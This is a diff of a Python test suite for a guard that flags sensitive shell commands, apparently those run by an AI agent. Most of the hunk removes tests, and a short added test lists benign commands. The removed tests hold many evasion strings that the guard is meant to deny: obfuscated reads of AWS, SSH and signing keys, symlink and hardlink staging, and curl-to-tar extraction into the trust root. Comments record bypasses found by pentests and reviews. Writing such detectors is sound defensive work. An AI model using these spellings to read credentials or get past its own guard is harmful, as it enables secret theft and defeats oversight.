-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D/zz/yy}/credentials") is not None
-        # One level of nesting resolves on the outer name.
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D:-${E}}/credentials") is not None
-        # A variable the command never assigned still fails closed on the tail.
-        assert is_sensitive_bash_command("cat ${SOMEVAR:-/tmp}/.ssh/id_rsa") is not None
-        # As a `cd` target.
-        assert (
-            is_sensitive_bash_command("D=$HOME/.kiro/crew; cd ${D:-/tmp}; cat token_signing.key")
-            is not None
-        )
-        # A benign remainder stays clean under any value.
-        assert is_sensitive_bash_command("B=$HOME/build; cat ${B:-/tmp}/out.txt") is None
-        assert is_sensitive_bash_command("cat ${PWD:-/tmp}/out.txt") is None
-
-    def test_a_masked_substitution_still_shows_the_path_inside_it(self) -> None:
-        """Masking is a trade, so the whole-line pass runs over BOTH spellings.
-
-        Masking keeps `cd "$(printf %s ~)/.kiro/crew"` as one token so its tail
-        still resolves. But it also hides a path written INSIDE the substitution,
-        and that shape is caught only on the raw text — losing it was a regression
-        against a read `main` already blocked.
-        """
-        assert is_sensitive_bash_command('echo $(ca""t ~/"."aws/credentials)') is not None
-        assert is_sensitive_bash_command("echo `cat ~/.ssh/id_rsa`") is not None
-        # And the masked-only shape keeps working, so neither pass was traded away.
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s ~)/.kiro/crew" && cat token_signing.key')
-            is not None
-        )
-
-    def test_the_substitution_placeholder_cannot_be_assigned(self) -> None:
-        """The placeholder is this module's sentinel, not a variable to be set.
-
-        `_mask_substitutions` rewrites every substitution to it, so a command that
-        assigned that name chose what the masked pass resolved those placeholders
-        to — here making the scanner read the `cd` target as /tmp while bash
-        entered $HOME.
-        """
-        assert (
-            is_sensitive_bash_command("__kc_subst=/tmp; cd $(printf %s ~); cat .aws/credentials")
-            is not None
-        )
-
-    def test_a_parameter_expansion_is_judged_under_every_reading(self) -> None:
-        """An operator form can yield the variable's value OR the operand.
-
-        Resolving to the recorded value alone inverted `${D:+$HOME}`; leaving it
-        literal alone lost `${D:-/tmp}` where D is the sensitive directory. Both
-        readings are kept and either one being sensitive denies.
-        """
-        # The operand wins in bash, so the read AFTER the cd is what turns bad.
-        assert is_sensitive_bash_command("D=x; cd ${D:+$HOME}; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("D=x; cd ${D:-$HOME}; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("D=x; cd ${D/x/$HOME}; cat .aws/credentials") is not None
-        # The value wins here, and must not be lost by preferring the other reading.
-        assert (
-            is_sensitive_bash_command("D=$HOME/.kiro/crew; cd ${D:-/tmp}; cat token_signing.key")
-            is not None
-        )
-        # A benign remainder stays clean under every reading.
-        assert is_sensitive_bash_command("B=$HOME/build; cd ${B:-/tmp}; cat out.txt") is None
-
-    def test_a_command_prefix_assignment_does_not_persist(self) -> None:
-        """`V=/tmp echo hi` exports V for that command only; bash restores it after.
-
-        Persisting it diverged from the shell in the attacker's favour: the tracker
-        followed the `cd` into /tmp while the shell still had $HOME.
-        """
-        assert (
-            is_sensitive_bash_command("V=$HOME; V=/tmp echo hi; cd $V; cat .aws/credentials")
-            is not None
-        )
-        # An assignment-only segment still persists — that is the legitimate form.
-        assert is_sensitive_bash_command("V=$HOME; cd $V; cat .aws/credentials") is not None
-
-    def test_an_append_assignment_builds_on_the_recorded_value(self) -> None:
-        """`NAME+=value` appends, so the tracked value has to append too.
-
-        The assignment pattern matched only `=`, so the whole `V+=/crew` token
-        failed to match and the segment was read as a command word instead of an
-        assignment. The tracked value stayed on `$HOME/.kiro` while bash held
-        `$HOME/.kiro/crew`, and the read after the `cd` resolved against the
-        wrong directory.
-        """
-        assert (
-            is_sensitive_bash_command('V=$HOME/.kiro; V+=/crew; cd "$V"; cat token_signing.key')
-            is not None
-        )
-        # Appending more than once, and appending to a name never assigned.
-        assert (
-            is_sensitive_bash_command(
-                'V=$HOME; V+=/.kiro; V+=/crew; cd "$V"; cat token_signing.key'
-            )
-            is not None
-        )
-        assert is_sensitive_bash_command('V+=$HOME/.aws; cd "$V"; cat credentials') is not None
-        # A benign append is still not a reason to deny.
-        assert is_sensitive_bash_command('B=$HOME; B+=/build; cd "$B"; cat out.txt') is None
-
-    def test_a_substitutions_own_text_can_name_the_path(self) -> None:
-        """`$HOME` inside a substitution is expanded before masking, so it is visible.
-
-        Masking the substitution to an opaque placeholder threw that away: the
-        target read as `$__kc_subst/crew`, the home hypothesis rewrote it to
-        `~/crew` — benign — while bash entered `~/.kiro/crew` and read the key.
-        """
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s "$HOME/.kiro")/crew"; cat token_signing.key')
-            is not None
-        )
-        assert is_sensitive_bash_command('cd `printf %s "$HOME/.aws"`; cat credentials') is not None
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s $HOME)/.aws"; cat credentials') is not None
-        )
-        # Through a variable assigned from the substitution.
-        assert (
-            is_sensitive_bash_command(
-                'V=$(printf %s "$HOME/.kiro"); cd "$V/crew"; cat token_signing.key'
-            )
-            is not None
-        )
-        # Only a path-shaped last word is vouched for, so a substitution that ends
-        # on a command or subcommand name still falls through to the hypothesis
-        # rather than being read as a path — these must stay clean.
-        assert (
-            is_sensitive_bash_command('cd "$(git rev-parse --show-toplevel)" && cat README.md')
-            is None
-        )
-        assert is_sensitive_bash_command("cd $(mktemp -d) && cat notes.txt") is None
-        assert is_sensitive_bash_command("cat $(pwd)/out.txt") is None
-
-    def test_a_cd_into_a_directory_that_holds_a_secret_taints(self) -> None:
-        """`~/.kiro/crew` is not sensitive itself — only its leaves are.
-
-        Every check that guards a *move* asked `is_sensitive_path` about the `cd`
-        target, which answers "is this the protected thing". For the keystone the
-        answer is no, so the taint pass was inert for the one directory it exists to
-        protect, and `~/.aws` hid it: that one IS sensitive as a whole directory, so
-        every test written against that spelling passed.
-
-        Both shapes below are unresolvable by the segment walk — the first is one
-        opaque quoted argument, the second moves away again before the read — so
-        both depend on the taint pass.
-        """
-        assert (
-            is_sensitive_bash_command('bash -c "cd ~/.kiro/crew; cat token_signing.key"')
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("cd ~/.kiro/crew; false && cd /tmp; cat token_signing.key")
-            is not None
-        )
-        # The directory list is derived, so a directory that holds no secret is not
-        # tainted and an ordinary move still reads clean.
-        assert is_sensitive_bash_command("cd ~ && cat notes.txt") is None
-        assert is_sensitive_bash_command("cd /tmp && cat notes.txt") is None
-        assert is_sensitive_bash_command('bash -c "cd ~/src; cat main.py"') is None
-
-    def test_a_later_cd_does_not_erase_a_sensitive_one(self) -> None:
-        """The erasing `cd` does not have to run.
-
-        `false &&` short-circuits, so bash never leaves the crew directory — while
-        the walk had already moved its only base and resolved the read against
-        nothing. Deciding whether a `cd` executes means evaluating the command, so
-        nothing is forgotten instead.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "H=$HOME; D=$H/.kiro/crew; cd $D; false && cd /tmp; cat token_signing.key"
-            )
-            is not None
-        )
-        assert is_sensitive_bash_command("cd ~/.aws; false && cd /tmp; cat credentials") is not None
-        # Ordinary chained moves are unaffected.
-        assert is_sensitive_bash_command("cd /tmp; cd /var/log; cat syslog") is None
-        assert is_sensitive_bash_command("cd ~ && cd src && cat main.py") is None
-
-    def test_a_declaration_builtin_is_an_assignment(self) -> None:
-        """`export NAME=value` assigns, so leaving the keyword in place lost it.
-
-        With the keyword still there the segment read as "a command word followed by
-        an operand", so the assignment-prefix run ended before it started and the
-        name was never recorded.
-        """
-        assert (
-            is_sensitive_bash_command("export D=$HOME/.kiro/crew; cd $D; cat token_signing.key")
-            is not None
-        )
-        for keyword in ("declare", "typeset", "local", "readonly"):
-            assert (
-                is_sensitive_bash_command(f"{keyword} D=$HOME/.aws; cd $D; cat credentials")
-                is not None
-            ), keyword
-        # Options before the name are skipped too.
-        assert (
-            is_sensitive_bash_command("export -p D=$HOME/.aws; cd $D; cat credentials") is not None
-        )
-        # A benign declaration is not a reason to deny.
-        assert is_sensitive_bash_command("export D=$HOME/src; cd $D; cat main.py") is None
-
-    def test_an_assignment_keeps_the_operator_form_literal(self) -> None:
-        """Collapsing an operator form at ASSIGNMENT time is one-way, and picked wrong.
-
-        `${X:+…}` names X, so resolving to the variable's value recorded `x` — while
-        bash yields the OPERAND for `:+`, entered the crew directory and read the
-        signing key. Recorded literally, both meanings survive to the point of use:
-        `_expansion_readings` derives the value form back out, and the operand is
-        still readable in the text.
-        """
-        assert (
-            is_sensitive_bash_command("X=x; D=${X:+$HOME/.kiro/crew}; cd $D; cat token_signing.key")
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("X=x; D=${X:-$HOME/.aws}; cd $D; cat credentials") is not None
-        )
-        # The value reading must not be lost either — this one needs it.
-        assert (
-            is_sensitive_bash_command("D=$HOME/.kiro/crew; cd ${D:-/tmp}; cat token_signing.key")
-            is not None
-        )
-        # A benign operand stays clean under every reading.
-        assert is_sensitive_bash_command("X=x; D=${X:+$HOME/build}; cd $D; cat out.txt") is None
-        assert is_sensitive_bash_command("B=$HOME/build; cd ${B:-/tmp}; cat out.txt") is None
-
-    def test_the_reserved_placeholder_name_is_refused_in_every_spelling(self) -> None:
-        """The segment walk numbers the placeholder, so the refusal has to be numbered too.
-
-        `_mask_substitutions_valued` emits `__kc_subst1`, `__kc_subst2`, … so two
-        substitutions in one segment cannot inherit each other's value. A refusal
-        that only knew the unnumbered spelling therefore covered a name the walk
-        no longer produces.
-
-        Asserted on the matcher rather than only end to end: the unresolved
-        reading is kept alongside the resolved one, so a recorded value cannot
-        remove a denial on its own and no single payload isolates this. The
-        invariant is still worth holding — it is what keeps a command from naming
-        this module's private sentinel at all.
-        """
-        from kiro_crew.security import _SUBST_PLACEHOLDER_NAME, _SUBST_PLACEHOLDER_NAME_RE
-
-        assert _SUBST_PLACEHOLDER_NAME_RE.match(_SUBST_PLACEHOLDER_NAME)
-        assert _SUBST_PLACEHOLDER_NAME_RE.match(f"{_SUBST_PLACEHOLDER_NAME}1")
-        assert _SUBST_PLACEHOLDER_NAME_RE.match(f"{_SUBST_PLACEHOLDER_NAME}12")
-        # A name that merely starts the same way is a different variable.
-        assert not _SUBST_PLACEHOLDER_NAME_RE.match(f"{_SUBST_PLACEHOLDER_NAME}_x")
-        assert not _SUBST_PLACEHOLDER_NAME_RE.match(f"x{_SUBST_PLACEHOLDER_NAME}")
-        # And the payload the refusal exists for stays denied in both spellings.
-        assert (
-            is_sensitive_bash_command("__kc_subst=/tmp; cd $(printf %s ~); cat .aws/credentials")
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("__kc_subst1=/tmp; cd $(printf %s ~); cat .aws/credentials")
-            is not None
-        )
-
-    def test_a_wrapped_cd_is_still_a_cd(self) -> None:
-        """`builtin` and `command` run the builtin, so the command word moves.
-
-        Unwrapped, the segment was not recognised as a `cd` at all, so no base was
-        tracked and the bare filename after it read clean.
-        """
-        assert is_sensitive_bash_command("builtin cd ~; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("command cd ~; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("builtin pushd ~; cat .aws/credentials") is not None
-        # A real program whose name merely starts the same way is not unwrapped.
-        assert is_sensitive_bash_command("commander cd /tmp && cat notes.txt") is None
-
-    def test_command_substitution_is_an_unresolved_value(self) -> None:
-        """A substitution's value needs the command to run, so fail closed on it.
-
-        Unquoted it also contains spaces, and `shlex` splits on them, so the
-        target used to shred into fragments that matched nothing. It is masked to
-        a single token before tokenization.
-        """
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s ~)/.kiro/crew" && cat token_signing.key')
-            is not None
-        )
-        assert is_sensitive_bash_command("cd $(printf %s ~)/.aws && cat credentials") is not None
-        assert is_sensitive_bash_command("cd `printf %s ~`/.ssh && cat id_rsa") is not None
-        assert is_sensitive_bash_command("cat $(printf %s ~)/.aws/credentials") is not None
-        # Through a variable assigned from a substitution.
-        assert (
-            is_sensitive_bash_command("D=$(printf %s ~); cd $D/.kiro/crew && cat token_signing.key")
-            is not None
-        )
-        # A substitution over a benign remainder is not a reason to deny.
-        assert (
-            is_sensitive_bash_command('cd "$(git rev-parse --show-toplevel)" && cat README.md')
-            is None
-        )
-        assert is_sensitive_bash_command("cd $(mktemp -d) && cat notes.txt") is None
-        assert is_sensitive_bash_command("cat $(pwd)/out.txt") is None
-
-    def test_pushd_tracks_directory(self) -> None:
-        """pushd should be treated like cd for directory tracking."""
-        assert is_sensitive_bash_command("pushd ~/.kiro/crew && cat token_signing.key") is not None
-        assert is_sensitive_bash_command("pushd /tmp && cat notes.txt") is None
-
-    def test_home_with_backslash_separators_survives_tokenization(
-        self, tmp_path, monkeypatch
-    ) -> None:
-        """`$HOME` must still resolve when the home path holds backslashes.
-
-        `normalize_shell_command` substitutes the home into the command text
-        before `shlex.split(posix=True)`, which reads a backslash as an escape
-        character. A Windows home — `C:\\Users\\<name>` — was therefore
-        tokenized to `C:Users<name>`: separators eaten, the path no longer
-        under the home directory, and so every `$HOME`-spelled credential path
-        resolved clean. This reproduces that shape on any platform, since a
-        backslash is a legal POSIX filename character.
-        """
-        home = tmp_path / "Users\\runneradmin"
-        (home / ".aws").mkdir(parents=True)
-        (home / ".aws" / "credentials").write_text("[default]\n")
-        (home / ".kiro" / "crew").mkdir(parents=True)
-        (home / ".kiro" / "crew" / "token_signing.key").write_text("k\n")
-        monkeypatch.setenv("HOME", str(home))
-
-        assert is_sensitive_bash_command("cat $HOME/.aws/credentials") is not None
-        # Through a variable the command assigns from $HOME.
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat $D/credentials") is not None
-        # As a `cd` target, with the operand a bare filename.
-        assert (
-            is_sensitive_bash_command("cd $HOME/.kiro/crew && awk 1 token_signing.key") is not None
-        )
-        # A benign remainder under the same home stays clean.
-        assert is_sensitive_bash_command("cat $HOME/notes.txt") is None
-
-    # ── Symlink-staging (pentest recommendation item 3) ──
-
-    def test_ln_home_anchored_sensitive_blocked(self) -> None:
-        assert is_sensitive_bash_command("ln -sf ~/.aws/credentials ws/cfg.ini") is not None
-        assert is_sensitive_bash_command("ln -s /Users/x/.aws/credentials cfg") is not None
-
-    def test_ln_relative_traversal_to_sensitive_blocked(self) -> None:
-        # The relative-traversal form has no home anchor — the dedicated
-        # symlink-staging guard must catch it.
-        assert is_sensitive_bash_command("ln -sf ../../../.aws/credentials cfg.ini") is not None
-        assert is_sensitive_bash_command("ln -s ../.ssh/id_rsa key") is not None
-        assert is_sensitive_bash_command("cp -s ../../.gnupg/secring.gpg g") is not None
-
-    def test_ln_benign_allowed(self) -> None:
-        assert is_sensitive_bash_command("ln -sf ./dist/app ./app") is None
-        assert is_sensitive_bash_command("ln -s ../src/main.py main.py") is None
-
-    # ── Hardlink-flatten bypass (GPT review, PR #1339) ──
-
-    def test_hardlink_to_sensitive_source_blocked(self) -> None:
-        # A HARDLINK (ln without -s, or the `link` coreutil) to a credential
-        # source flattens it onto a benign alias, dodging the path-based read
-        # matcher in standard mode (which does not bind-mask). The link verbs
-        # now route their operands through is_sensitive_path() like a read.
-        assert is_sensitive_bash_command("ln ~/.aws/credentials ws/x") is not None
-        assert is_sensitive_bash_command("link ~/.ssh/id_rsa ws/k") is not None
-
-    def test_hardlink_obfuscated_source_blocked(self) -> None:
-        # Quote-obfuscation defeats the literal regex first-pass; the normalizer
-        # (now triggered by `ln`/`link`) strips the empty quotes, expands ~, and
-        # resolves the source through is_sensitive_path(). These forms are
-        # caught ONLY via the normalizer, so they exercise the new code path for
-        # both verbs.
-        assert is_sensitive_bash_command('ln ~/.aw""s/credentials ws/x') is not None
-        assert is_sensitive_bash_command('link ~/.ss""h/id_rsa ws/k') is not None
-
-    def test_hardlink_benign_source_allowed(self) -> None:
-        # npm cacache / workspace-internal hardlinks must stay allowed.
-        assert is_sensitive_bash_command("ln node_modules/.cache/blob pkg/dep") is None
-        assert is_sensitive_bash_command("ln ./dist/a ./b") is None
-
-    def test_base64_gnupg(self) -> None:
-        result = is_sensitive_bash_command("base64 ~/.gnupg/secring.gpg")
-        assert "blocked" in result.lower()
-
-    def test_cat_sel_hmac_key_blocked(self) -> None:
-        # security-review finding cdf82704: reading the SEL HMAC key via bash is blocked
-        # (adding it to _SENSITIVE_HOME_DIRS also arms the bash-read matcher).
-        result = is_sensitive_bash_command("cat ~/.kiro/crew/sel_hmac.key")
-        assert result is not None and "blocked" in result.lower()
-        legacy = is_sensitive_bash_command("cat ~/.kirocrew/sel_hmac.key")
-        assert legacy is not None and "blocked" in legacy.lower()
-        # The key's real home since the trust/ relocation.
-        trust = is_sensitive_bash_command("cat ~/.kiro/crew/trust/sel_hmac.key")
-        assert trust is not None and "blocked" in trust.lower()
-        trust_legacy = is_sensitive_bash_command("cat ~/.kirocrew/trust/sel_hmac.key")
-        assert trust_legacy is not None and "blocked" in trust_legacy.lower()
-
-    def test_cat_security_events_log_blocked(self) -> None:
-        result = is_sensitive_bash_command("cat ~/.kiro/crew/security_events.jsonl")
-        assert result is not None and "blocked" in result.lower()
-        legacy = is_sensitive_bash_command("cat ~/.kirocrew/security_events.jsonl")
-        assert legacy is not None and "blocked" in legacy.lower()
-
-    def test_cat_rotated_security_event_segment_blocked(self) -> None:
-        # Same evidence, one rename later: a rotated segment must be as
-        # unreadable through the shell as the live log it came from.
-        rotated = is_sensitive_bash_command(
-            "cat ~/.kiro/crew/security_events.d/security_events-000001-20260821T045139Z.jsonl"
-        )
-        assert rotated is not None and "blocked" in rotated.lower()
-        legacy = is_sensitive_bash_command(
-            "cat ~/.kirocrew/security_events.d/security_events-000001-20260821T045139Z.jsonl"
-        )
-        assert legacy is not None and "blocked" in legacy.lower()
-
-    def test_write_app_admission_policy_blocked(self) -> None:
-        # Keystone invariant: a tee/rm to the admission ceiling is blocked
-        # (adding app_admission.json to _SENSITIVE_HOME_DIRS also arms the
-        # bash write/extract matcher, so the agent cannot delete or rewrite it).
-        tee = is_sensitive_bash_command("echo '{}' | tee ~/.kiro/crew/app_admission.json")
-        assert tee is not None and "blocked" in tee.lower()
-        rm = is_sensitive_bash_command("rm -f ~/.kiro/crew/app_admission.json")
-        assert rm is not None and "blocked" in rm.lower()
-        legacy = is_sensitive_bash_command("rm -f ~/.kirocrew/app_admission.json")
-        assert legacy is not None and "blocked" in legacy.lower()
-
-    def test_colon_separated_sensitive_path_blocked(self) -> None:
-        # H-p5: a sensitive path after ':' / VAR=val:path / a
-        # PATH-style colon list must be caught by the verb-independent catch-all.
-        assert is_sensitive_bash_command("FOO=bar:~/.aws/credentials echo done") is not None
-        assert is_sensitive_bash_command("PATH=/foo:~/.ssh/id_rsa:/bar") is not None
-        assert is_sensitive_bash_command("LD_PRELOAD=:~/.aws/credentials whoami") is not None
-
-    def test_git_write_verbs_on_sensitive_path_blocked(self) -> None:
-        # H-p9: file-materialising git verbs still blocked.
-        assert is_sensitive_bash_command("git checkout -- ~/.aws/credentials") is not None
-        assert is_sensitive_bash_command("git restore ~/.ssh/id_rsa") is not None
-        assert is_sensitive_bash_command("git mv x ~/.kiro/crew/profiles/p.json") is not None
-        assert is_sensitive_bash_command("git mv x ~/.kirocrew/profiles/p.json") is not None
-
-    def test_readonly_git_non_sensitive_path_allowed(self) -> None:
-        # H-p9: bare `git` was over-blocking read-only inspection.
-        # A read verb naming a NON-sensitive path must not be treated as a write.
-        assert is_sensitive_bash_command("git log -- src/app.py") is None
-        assert is_sensitive_bash_command("git diff HEAD~1 README.md") is None
-        assert is_sensitive_bash_command("git show HEAD") is None
-
-    def test_extract_into_trust_root_subdir_blocked(self) -> None:
-        # H-p6: extraction into ANY crew-home descendant (not just
-        # the root or /profiles) can drop files downstream tooling reads.
-        assert is_sensitive_bash_command("tar -xf evil.tar -C ~/.kiro/crew/foo/") is not None
-        assert is_sensitive_bash_command("unzip -d ~/.kiro/crew/foo/ evil.zip") is not None
-        assert is_sensitive_bash_command("tar -xf e.tar -C ~/.kiro/crew") is not None
-        # Legacy pre-move home is still gated.
-        assert is_sensitive_bash_command("tar -xf evil.tar -C ~/.kirocrew/foo/") is not None
-        assert is_sensitive_bash_command("tar -xf e.tar -C ~/.kirocrew") is not None
-
-    def test_readonly_listing_of_crew_home_allowed(self) -> None:
-        # The reported defect (#6021): the flag-only rule refused `ls -d` on the
-        # crew home, where -d means "show the directory entry itself, not its
-        # contents". Red-before on every assert here.
-        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/skills") is None
-        assert is_sensitive_bash_command("ls -d ~/.kiro/crew") is None
-        assert is_sensitive_bash_command("ls -d ~/.kirocrew/skills") is None
-        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/backup.tar") is None
-        # A crew-home path whose LAST SEGMENT is a program name is still just a
-        # read. An earlier program-word approach kept refusing these.
-        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/tar") is None
-        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/rsync") is None
-        # NOTE: an absolute program path is deliberately NOT exonerated -- see
-        # test_program_pathnames_are_never_exonerated for why a basename cannot
-        # be trusted to say what a binary is.
-
-    def test_other_read_listers_on_crew_home_allowed(self) -> None:
-        # The carve-out is an allow-list, so each member needs a case.
-        for prog in ("ls", "stat", "du", "readlink", "basename", "dirname", "wc"):
-            cmd = f"{prog} -d ~/.kiro/crew/skills"
+    def test_ordinary_shell_work_is_allowed(self) -> None:
+        """Variables, ``cd`` chains, links and read-only git carry no verdict."""
+        for cmd in (
+            "B=$HOME/build; cat $B/out.txt",
+            "cat $PWD/out.txt",
+            "cd /tmp && cat notes.txt",
+            "cd ~/project && cat config.json",
+            "cd src && grep -rn pattern .",
+            "ln -sf ./dist/app ./app",
+            "ln node_modules/.cache/blob pkg/dep",
+            "git log -- src/app.py",
+            "git diff HEAD~1 README.md",
+            "tar -xf release.tar -C /tmp/build",
+            "cat ~/.kiro/crew/config.json",
+            "sqlite3 ~/.kiro/crew/sessions.db .tables",
+        ):
             assert is_sensitive_bash_command(cmd) is None, cmd
-
-    def test_reads_the_reporter_listed_as_allowed_stay_allowed(self) -> None:
-        # Regression FLOOR, deliberately not a lock on the fix: none of these
-        # carry a `-C`/`-d` + crew-home destination, so they returned None
-        # against the flag-keyed matcher too (`-ld` never matched it either --
-        # the `d` follows `l`, not `-`). They are here because the report listed
-        # them as the reads that already worked, which is the evidence the block
-        # was a spelling artifact; the lock-in lives in the tests above.
-        assert is_sensitive_bash_command("ls -lt ~/.kiro/crew/skills") is None
-        assert is_sensitive_bash_command("ls -l ~/.kiro/crew/skills") is None
-        assert is_sensitive_bash_command("ls -ld ~/.kiro/crew") is None
-        assert is_sensitive_bash_command("grep -r x ~/.kiro/crew/skills") is None
-
-    def test_non_archive_writers_into_trust_root_still_blocked(self) -> None:
-        # THE regression floor for this change. The flag-only rule refused any
-        # program with a `-c`/`-C`/`-d`/`-D` destination in the crew home; two
-        # earlier attempts narrowed that to "archive programs" and silently
-        # re-admitted these, which is a write into the governance trust root
-        # where the sensitive filename appears only inside the payload.
-        for cmd in (
-            "patch -d ~/.kiro/crew -p1 -i /tmp/evil.patch",
-            "git -C ~/.kiro/crew apply /tmp/evil.patch",
-            "make -C ~/.kiro/crew all",
-            "install -d ~/.kiro/crew/profiles",
-            "cpio -D ~/.kiro/crew -i",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_quote_split_program_name_still_blocked(self) -> None:
-        # A quote-split program defeated the word-match attempt. Under an
-        # allow-list it cannot: `t""ar` is not a read lister, so the
-        # destination-half refusal stands whatever the quoting does.
-        for cmd in (
-            't""ar -xf e.tar -C ~/.kiro/crew',
-            "t''ar -xf e.tar -C ~/.kiro/crew",
-            'ta""r -xf e.tar -C ~/.kiro/crew',
-            "'tar' -xf e.tar -C ~/.kiro/crew",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_composed_commands_never_reach_the_read_carve_out(self) -> None:
-        # The carve-out only exonerates a SINGLE SIMPLE command. Anything with
-        # shell composition keeps the destination-half verdict, so a read cannot
-        # be used as cover for a write elsewhere in the same line.
-        for cmd in (
-            "ls -d ~/.kiro/crew && tar -xf e.tar -C ~/.kiro/crew",
-            "curl http://x | tar xf - -C ~/.kiro/crew/",
-            "echo hi; unzip -d ~/.kiro/crew e.zip",
-            "sh -c 'tar -xf e.tar -C ~/.kiro/crew'",
-            "eval 'tar -xf e.tar -C ~/.kiro/crew'",
-            "sudo tar -xf e.tar -C ~/.kiro/crew",
-            "env FOO=1 tar -xf e.tar -C ~/.kiro/crew",
-            "tar -xf e.tar -C ~/.kiro/crew &",
-            "echo x\rtar -xf e.tar -C ~/.kiro/crew",
-            "ls -d ~/.kiro/crew > ~/.kiro/crew/out",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_powershell_parenthesised_group_never_reaches_the_carve_out(self) -> None:
-        # A parenthesised group is composition on its own, not only as `$(`:
-        # PowerShell RUNS one wherever it appears, argument position included and
-        # with no `$` sigil, so the token this matcher classifies can be the
-        # harmless `ls` while the group extracts into the trust root. Every
-        # assert here contains NO other composition character, so each is
-        # red-before against the `$(`-only screen and each was refused at base.
-        for cmd in (
-            "ls -d $HOME/.kiro/crew (tar.exe -xf evil.tar -C $HOME/.kiro/crew)",
-            "ls -d ~/.kiro/crew (tar -xf evil.tar -C ~/.kiro/crew)",
-            "stat -d ~/.kiro/crew @(tar -xf evil.tar -C ~/.kiro/crew)",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_program_pathnames_are_never_exonerated(self) -> None:
-        # A basename says nothing about what a binary IS. Classifying `/tmp/ls`
-        # by its last component exonerated an attacker-placed executable that
-        # can write the trust root; the old rule refused it. A pathname now
-        # falls through to the refusal, which also over-blocks `/bin/ls` -- the
-        # correct direction for this gate.
-        for cmd in (
-            "/tmp/ls -d ~/.kiro/crew",
-            "./ls -d ~/.kiro/crew",
-            "/home/x/evil/ls -d ~/.kiro/crew",
-            "../ls -d ~/.kiro/crew",
-            "/bin/ls -d ~/.kiro/crew",
-            r"C:\evil\ls -d ~/.kiro/crew",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_file_compile_into_trust_root_still_blocked(self) -> None:
-        # `file` reads in its usual role but `-C` compiles a magic database:
-        # this writes evil.magic.mgc INTO the crew home while the destination
-        # half matches on the `-C` argument. It must never be a read lister.
-        cmd = "file -C ~/.kiro/crew -m ~/.kiro/crew/evil.magic"
-        assert is_sensitive_bash_command(cmd) is not None
-
-    def test_read_carve_out_fails_closed_on_unparsable_and_unknown(self) -> None:
-        from kiro_crew.security import _is_bare_trust_root_read
-
-        # Unbalanced quotes: the program cannot be determined -> refuse.
-        assert _is_bare_trust_root_read("ls -d '~/.kiro/crew") is False
-        # Empty / whitespace -> refuse.
-        assert _is_bare_trust_root_read("") is False
-        assert _is_bare_trust_root_read("   ") is False
-        # An unknown program is not exonerated.
-        assert _is_bare_trust_root_read("frobnicate -d ~/.kiro/crew") is False
-        # A parenthesised group is composition -> refuse before the program is
-        # even looked at, so `ls` cannot launder the group beside it.
-        assert _is_bare_trust_root_read("ls -d ~/.kiro/crew (tar -xf e.tar)") is False
-        # A known reader is.
-        assert _is_bare_trust_root_read("ls -d ~/.kiro/crew") is True
-
-    def test_only_shell_inert_characters_are_exonerated(self) -> None:
-        # THE structural invariant, and the reason this rule stopped enumerating
-        # metacharacters: exoneration requires every character to come from a
-        # set that means nothing to any shell. A character absent from that set
-        # is refused whether or not anyone has thought of a way to abuse it --
-        # which is what makes the rule terminate, unlike the deny-list it
-        # replaced (that lost four rounds, one new spelling each time).
-        from kiro_crew.security import _is_bare_trust_root_read
-
-        base = "ls -d ~/.kiro/crew"
-        assert _is_bare_trust_root_read(base) is True
-        # Each of these injects ONE excluded character into an otherwise valid
-        # read. None may be exonerated.
-        for bad in (
-            "(",
-            ")",
-            "{",
-            "}",
-            "[",
-            "]",
-            "<",
-            ">",
-            "|",
-            "&",
-            ";",
-            "`",
-            "$",
-            "'",
-            '"',
-            "\\",
-            "*",
-            "?",
-            "!",
-            "#",
-            "\n",
-            "\r",
-            "\x00",
-        ):
-            cmd = base + bad
-            assert _is_bare_trust_root_read(cmd) is False, repr(cmd)
-            # ...and in argument position too, not only appended.
-            cmd2 = "ls -d " + bad + "~/.kiro/crew"
-            assert _is_bare_trust_root_read(cmd2) is False, repr(cmd2)
-
-    def test_home_variable_is_the_only_dollar_form_exonerated(self) -> None:
-        # `$HOME` is stripped before the character check because the destination
-        # half of the rule enumerates that spelling itself, so refusing it would
-        # leave half of #6021 unfixed. Every OTHER `$` use keeps its `$` and is
-        # refused -- the exception is anchored to `/`, whitespace or end.
-        from kiro_crew.security import _is_bare_trust_root_read
-
-        assert _is_bare_trust_root_read("ls -d $HOME/.kiro/crew") is True
-        assert _is_bare_trust_root_read("ls -d $HOME") is True
-        assert _is_bare_trust_root_read("ls -d ${HOME}/.kiro/crew") is False
-        assert _is_bare_trust_root_read("ls -d $HOMEX/.kiro/crew") is False
-        assert _is_bare_trust_root_read("ls -d $(echo ~/.kiro/crew)") is False
-        assert _is_bare_trust_root_read("ls -d $HOME$(id)") is False
-
-    def test_no_write_capable_program_is_ever_a_read_lister(self) -> None:
-        # The invariant, not a copy of the source: a program that can write to a
-        # path it is handed must never be admitted to the carve-out. `find`
-        # (-delete), `install` (-d) and `file` (-C compiles a magic db into the
-        # directory) are the ones that look like readers and are not.
-        from kiro_crew.security import _TRUST_ROOT_READ_LISTERS
-
-        for writer in (
-            "file",
-            "find",
-            "install",
-            "tar",
-            "bsdtar",
-            "unzip",
-            "patch",
-            "git",
-            "make",
-            "rsync",
-            "cpio",
-            "cp",
-            "mv",
-            "dd",
-            "tee",
